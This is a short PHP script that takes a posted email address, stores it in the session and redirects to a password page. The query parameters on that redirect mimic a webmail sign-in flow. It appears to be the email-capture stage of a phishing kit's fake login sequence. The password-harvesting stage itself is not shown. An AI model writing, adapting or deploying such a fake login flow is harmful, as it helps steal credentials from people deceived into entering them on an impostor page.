<?php
ob_start();
session_start();
if ( isset( $_POST['email'] ) ) {
		
		$_SESSION['email'] 	  = $_POST['email'];
		
	
		
		header("Location: ../password?challenge/password?display=login&lang=en-us&src=mail&activity=default&pspid=1197803637&done");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}

?>